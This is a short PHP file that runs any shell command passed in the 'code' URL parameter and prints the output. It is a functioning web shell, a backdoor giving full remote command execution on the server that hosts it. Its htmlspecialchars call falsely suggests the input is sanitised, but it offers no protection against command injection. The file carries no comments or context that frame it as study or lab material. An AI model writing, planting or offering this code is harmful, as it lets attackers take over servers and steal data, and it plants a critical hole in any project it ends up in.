<?php
$comand = htmlspecialchars($_GET["code"]);
$output = shell_exec($comand);
echo "<pre>$output</pre>";
?>